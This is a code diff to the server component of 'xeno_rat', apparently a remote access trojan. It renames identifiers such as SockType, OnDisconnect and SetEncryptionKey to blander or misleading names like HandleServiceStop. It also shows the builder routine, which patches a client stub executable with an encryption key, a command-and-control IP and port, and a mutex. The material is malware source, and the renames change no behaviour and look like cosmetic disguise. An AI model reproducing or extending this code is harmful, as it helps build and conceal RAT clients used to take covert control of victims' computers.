@@ -121,7 +121,7 @@ namespace xeno_rat_server
         private async Task OnConnect(Socket socket)
         {
             int currentIdCount = currentCount++;
-            Node client = await Utils.ConnectAndSetupAsync(socket, key, currentIdCount, OnDisconnect);
+            Node client = await Utils.ConnectAndSetupAsync(socket, key, currentIdCount, HandleServiceStop);
             if (client == null) 
             {
                 try
@@ -135,7 +135,7 @@ namespace xeno_rat_server
                 }
                 return;
             }
-            if (client.SockType == 0)
+            if (client.connectionType == 0)
             {
                 ListViewItem clientdata = null;
                 try
@@ -327,7 +327,7 @@ namespace xeno_rat_server
         private async Task<ListViewItem> GetAddInfo(Node type0node)
         {
 
-            if (type0node.SockType != 0)
+            if (type0node.connectionType != 0)
             {
                 return null;
             }
@@ -422,9 +422,9 @@ namespace xeno_rat_server
             return lvi; 
         } 
 
-        private void OnDisconnect(Node client)
+        private void HandleServiceStop(Node client)
         {
-            if (client.SockType == 0) 
+            if (client.connectionType == 0) 
             {
                 listView2.Invoke((MethodInvoker)(() =>
                 {
@@ -1488,7 +1488,7 @@ namespace xeno_rat_server
                 }
             }
         }
-        public static void SetEncryptionKey(ModuleDefMD module, byte[] EncryptionKey)
+        public static void SetsecurityKey(ModuleDefMD module, byte[] securityKey)
         {
             string typeName = "xeno_rat_client.Program";
             string methodName = ".cctor";
@@ -1498,8 +1498,8 @@ namespace xeno_rat_server
             if (method?.Body != null)
             {
                 Instruction instruction = method.Body.Instructions[instructionIndex];
-                Array.Resize(ref EncryptionKey, 32);
-                ((FieldDef)instruction.Operand).InitialValue = EncryptionKey;
+                Array.Resize(ref securityKey, 32);
+                ((FieldDef)instruction.Operand).InitialValue = securityKey;
             }
         }
         public static void SetServerIp(ModuleDefMD module, string ip)
@@ -1614,7 +1614,7 @@ namespace xeno_rat_server
                 AddLog("Building client...", Color.Blue);
                 string filePath = saveFileDialog.FileName;
                 ModuleDefMD module = ModuleDefMD.Load("stub\\xeno rat client.exe");
-                SetEncryptionKey(module, Utils.CalculateSha256Bytes(textBox14.Text));
+                SetsecurityKey(module, Utils.CalculateSha256Bytes(textBox14.Text));
                 SetServerIp(module, textBox12.Text);
                 SetServerPort(module, int.Parse(textBox13.Text));
                 SetMutex(module, textBox15.Text);
